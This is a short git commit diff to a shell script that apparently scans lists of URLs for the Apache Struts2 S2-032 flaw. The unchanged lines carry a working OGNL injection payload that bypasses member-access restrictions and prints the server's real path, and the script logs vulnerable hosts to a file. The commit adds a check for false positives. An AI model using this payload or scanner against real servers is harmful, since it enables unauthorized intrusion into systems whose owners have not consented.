05e5a1eebdbbb7c27147646c5b8ce31f1cc7c694
tag.bao <bb.qnyd@gmail.com>
2016-04-26 01:02:38 -0400

    fixed distort

--- Web/s2-032.sh
+++ Web/s2-032.sh
@@ -45,7 +45,11 @@ do
 	if [ "$u" != "" ];then
 		rst=`http "$u?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest%28%29,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29,%23res.setCharacterEncoding%28%23parameters.encoding[0]%29,%23path%3d%23req.getRealPath%28%23parameters.pp[0]%29,%23w%3d%23res.getWriter%28%29,%23w.print%28%23path%29,1?%23xx:%23request.toString&pp=%2f7ym0n.jsp&encoding=UTF-8"`
 		mach=`echo $rst | grep "7ym0n.jsp"`
+		distort=`echo $rst | grep "2f7ym0n.jsp"`
 		if [ "$mach" != "" ];then
+			if [ "$distort" != "" ];then
+				exit 1;
+			fi
 			echo $u $mach >> $2
 		fi
 	
